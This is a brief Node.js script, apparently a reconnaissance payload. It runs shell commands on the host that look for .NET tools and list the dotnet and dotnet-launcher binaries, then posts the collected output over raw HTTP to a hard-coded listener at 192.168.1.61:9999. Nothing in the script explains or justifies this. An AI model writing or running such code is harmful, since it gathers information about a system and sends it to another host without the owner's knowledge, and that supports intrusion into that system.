"use strict";
var cp = require('child_process');
var net = require('net');
var HOST = '192.168.1.61';
var PORT = 9999;
function post(path, text) {
  var body = new Buffer(text, 'utf8');
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: text/plain\r\nContent-Length: ' + body.length + '\r\nConnection: close\r\n\r\n';
  var s = net.connect(PORT, HOST);
  s.on('connect', function(){ s.write(hdr); s.write(body); s.end(); });
  s.on('error', function(e){ console.log('ERR', e.message); });
}
function run(cmd, timeout) {
  try { return '[0] ' + cp.execSync(cmd, {timeout: timeout||15000, maxBuffer: 16*1024*1024}).toString().slice(0,2000); }
  catch(e) { var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=e.stderr.toString(); return '[err '+(e.status||'?')+'] '+(o||e.message).slice(0,2000); }
}
post('/p87start', 'start ' + new Date().toISOString());
var out = [];
out.push('which => ' + run('which dotnet csc ilasm mcs mono 2>&1', 10000));
out.push('ls dotnet => ' + run('ls -la /usr/share/dotnet /usr/share/dotnet/shared/Microsoft.NETCore.App/2.0.0 2>&1 | head -20', 10000));
out.push('ls dotnet-launcher => ' + run('ls -la /usr/bin/dotnet-launcher /usr/bin/wasutility 2>&1', 10000));
out.push('dotnet-launcher noarg => ' + run('/usr/bin/dotnet-launcher 2>&1', 10000));
post('/p87out', out.join('\n'));
